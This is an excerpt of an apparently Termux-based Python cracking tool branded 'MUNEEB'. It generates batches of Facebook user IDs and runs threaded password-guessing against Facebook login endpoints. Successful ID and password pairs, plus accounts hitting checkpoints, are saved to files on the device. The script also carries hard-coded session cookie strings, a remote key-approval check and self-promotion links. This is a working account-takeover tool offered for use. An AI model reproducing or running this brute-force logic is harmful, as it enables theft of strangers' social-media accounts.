...
os.system('xdg-open https://www.youtube.com/@ammalik3919/')
...
\x1b[1;92m| $$  | $$| $$  | $$| $$\  $ | $$| $$  | $$| $$  | $$
\x1b[1;92m| $$  | $$| $$  | $$| $$ \/  | $$| $$  | $$| $$$$$$$/
\x1b[1;92m|__/  |__/|__/  |__/|__/     |__/|__/  |__/|_______/ 
╔══════════════════════════════════════╗
║        WELCOME TO AHMAD COMMAND      ║     
╚══════════════════════════════════════╝                                     
╔══════════════════════════════════════╗
║\033[1;97m[+] CREATED BY  : \033[1;92mM AHMAD MALIK   ║
║\033[1;97m[+] REQUESTED BY : \033[1;92mMUNEEB MINHAS  ║
║\033[1;97m[+] WHATSAPP   : \033[1;92m+923056673626    ║
║\033[1;97m[+] GITHUB     : \033[1;92mAHMAD0176        ║
║\033[1;97m[+] VERTION    : \033[1;92m0.1 (TRAIL)      ║
╚══════════════════════════════════════╝""")
def linex():
        print('\033[1;92m════════════════════════════════════════')
def linex():
        ...
        #       chk()
                ...
                if x == ("sex"):
                        ...
                        if xd in ['1','01']:
                                ...
                                os.system(f'xdg-open https://www.whatsapp.com/{wx}');menu()
                        elif xd in ['7','07']:
                                os.system('xdg-open https://www.youtube.com/@ammalik3919');menu()
                        elif xd in ['8','08']:
                                os.system('xdg-open https://www.youtube.com/@ammalik3919');menu()
                        elif xd in ['0','00']:
                                exit(' Thanks for use 🥰 ')
                        ...
                        linex()
                        url_wa = "https://www.youtube.com/@ammalik3919/"
                        name = input(" Enter your Name : ")
                        linex()
                        tks = ("Hi MUNEEB Sir, I Need To Buy Your Paid MUNEEB PRO Tools Version 0.0.1 Premium Please Accept My Key To Premium :)\n\n Name :- "+name+"\n Key :- "+fkeyx)
                        subprocess.check_output(["am", "start", url_wa+(tks)]);time.sleep(2)
                        print(' Run :  python MUNEEB.py')
                        exit()
        except ValueError:
                exit()
        except requests.exceptions.ConnectionError:
...
def pak():
                ...
                for nmbr in range(limit):
                        ...
                        user.append(nmp)
                with tred(max_workers=30) as MUNEEB:     
                        clear()
                        tl = str(len(user))
                        ...
                        for psx in user:
                                ...
                                MUNEEB.submit(rndm,ids,passlist)
                print('\033[1;37m')
                linex()
                print(' The process has completed')
                print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
...
def gmail():
                ...
                linex()
                print('\033[1;37m example: khan, MUNEEB, ali \033[1;97m')
                linex()
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [MUNEEB-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        MUNEEB=session.cookies.get_dict().keys()
                        if "c_user" in MUNEEB:
                                coki=session.cookies.get_dict()
                                kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                print('\r\r\033[1;32m [MUNEEB-OK] %s | %s'%(ids,pas))
                                open('/sdcard/MUNEEB-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in MUNEEB:
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m [MUNEEB-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/MUNEEB-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
                ...
                try:
                        ...
                        for pw in passlist:
                                ...
                                headers = {
                                        ...
                                        # 'cookie': 'm_pixel_ratio=1.25; x-referer=eyJyIjoiLyIsImgiOiIvIiwicyI6Im0ifQ%3D%3D; datr=aErjY8WQzQoBtHTKPnldWl8Q; sb=9ErjY0rWIr-LMZJlf2D65FwJ; wd=1519x718; fr=0xbm9pViIHoWB4rrD..Bj40s5.nb.AAA.0.0.BkEc1J.AWVXOe7Csng',
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m [MUNEEB-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/MUNEEB-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
...
def api1(ids,names,passlist):
    ...
    # 'cookie': 'datr=iGdKYyfcAB817biivkWWCUhU; sb=iGdKY-SNej4yXMqoxKp1Cugw; dpr=1.25; fr=0CSyIkPHGp9NY8VQK..BjSmeI.EA.AAA.0.0.BkEc6w.AWUEriUTECE; m_pixel_ratio=1; wd=1519x714',
    ...
    'user-agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:33.0) Gecko/20120101 Firefox/33.0',
                                ...
                                po = response = requests.get('m.facebook.com', cookies=cookies, headers=headers).text
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m [MUNEEB-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/MUNEEB-OK.txt','a').write(ids+'|'+pas+'\n')
...
def rndm(ids,passlist):
    ...
    'user-agent': 'Mozilla/5.0 (Android 4.4; Tablet; rv:41.0) Gecko/41.0 Firefox/41.0',
                                ...
                                if 'session_key' in q:
                                        uid=str(q['uid'])
                                        try:
                                                okk=open('/sdcard/MUNEEB-OK.txt','r').read()
                                                if uid in okk:pass
                                                else:
                                                        print('\r\r\033[1;32m [MUNEEB-OK] '+uid+' | '+pas+'\033[1;97m')
                                                        open('/sdcard/MUNEEB-OK.txt','a').write(uid+'|'+pas+'\n')
                                                        oks.append(ids)
                                                        break
                                        except:
                                                print('\r\r\033[1;32m [MUNEEB-OK] '+uid+' | '+pas+'\033[1;97m')
...
def Subscraption():
	...
	clear()
	print(logo)
	r1=requests.get("https://github.com/ahmadxmalik1/APPROVAL/blob/main/approval.txt").text
	if key1 in r1:
		os.system('clear')
		print(logo)
		Main()
		...
		print(logo)
		print ("")
		print(" \033[1;32mAHMAD Tool Free BUT You Need Get Approved First\033[1;37m\n")
		print(" \033[1;32m Note :TOOL FREE HA BHAIYO ENJOY KRO   \033[1;37m")
		print ("")
